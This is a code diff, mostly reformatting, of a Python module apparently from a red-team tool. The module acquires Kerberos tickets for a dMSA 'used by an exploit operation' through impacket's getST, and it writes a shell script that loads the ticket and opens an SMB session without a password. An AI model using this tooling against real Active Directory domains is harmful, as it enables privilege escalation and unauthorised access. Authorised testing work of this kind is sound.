@@ -34,7 +34,11 @@ def _utc_now_iso() -> str:
 
 def _pretty(principal: Any) -> str:
     value = principal.prettyPrint()
-    return value.decode("utf-8", errors="replace") if isinstance(value, bytes) else str(value)
+    return (
+        value.decode("utf-8", errors="replace")
+        if isinstance(value, bytes)
+        else str(value)
+    )
 
 
 def _principal_name(value: str) -> str:
@@ -56,7 +60,9 @@ def _inspect_ccache(
     try:
         cache = CCache.loadFile(str(path))
     except Exception as exc:
-        raise TicketAcquisitionError(f"produced artifact is not a valid ccache: {exc}") from exc
+        raise TicketAcquisitionError(
+            f"produced artifact is not a valid ccache: {exc}"
+        ) from exc
     if not cache.credentials:
         raise TicketAcquisitionError("produced ccache contains no credentials")
 
@@ -175,9 +181,7 @@ def _service_handoff(service: str) -> tuple[str, str]:
         if port_separator and port.isdigit():
             hostname = host_without_port
     if not spn_separator or not service_type or not hostname:
-        raise TicketAcquisitionError(
-            "service SPN must use the service/hostname form"
-        )
+        raise TicketAcquisitionError("service SPN must use the service/hostname form")
     return service_type.casefold(), hostname
 
 
@@ -280,7 +284,9 @@ def acquire_dmsa_tgt(
 ) -> dict[str, Any]:
     """Acquire and save a TGT for the dMSA used by an exploit operation."""
     if operation.status != "executed" or operation.cleaned_up:
-        raise TicketAcquisitionError("TGT acquisition requires an active executed operation")
+        raise TicketAcquisitionError(
+            "TGT acquisition requires an active executed operation"
+        )
     dmsa_sam = _operation_dmsa_sam(operation)
     if not dmsa_sam:
         raise TicketAcquisitionError("operation has no dMSA sAMAccountName")
@@ -296,7 +302,7 @@ def acquire_dmsa_tgt(
     run_dir.mkdir(parents=True, exist_ok=True, mode=0o700)
     os.chmod(run_dir, 0o700)
     stage = Path(tempfile.mkdtemp(prefix=".tgt-stage-", dir=run_dir))
-    started = time.time()
+    started = stage.stat().st_mtime
     dc_args = ["-dc-ip", dc_ip] if dc_ip else []
     try:
         request = _run_getst(
@@ -392,7 +398,7 @@ def acquire_dmsa_ticket(
     tgt_path = Path(tgt_result["tgt_ccache"])
     run_dir = tgt_path.parent
     service_stage = Path(tempfile.mkdtemp(prefix=".service-stage-", dir=run_dir))
-    service_started = time.time()
+    service_started = service_stage.stat().st_mtime
     dc_args = ["-dc-ip", dc_ip] if dc_ip else []
     try:
         second = _run_getst(
@@ -429,10 +435,7 @@ def acquire_dmsa_ticket(
         os.chmod(service_path, 0o600)
 
         use_path = run_dir / f"use-ticket-{artifact_key}.sh"
-        handoff = (
-            "#!/bin/sh\n"
-            f"export KRB5CCNAME={shlex.quote(str(service_path))}\n"
-        )
+        handoff = "#!/bin/sh\n" f"export KRB5CCNAME={shlex.quote(str(service_path))}\n"
         if service_type == "cifs":
             handoff += (
                 "smbclient.py -k -no-pass "
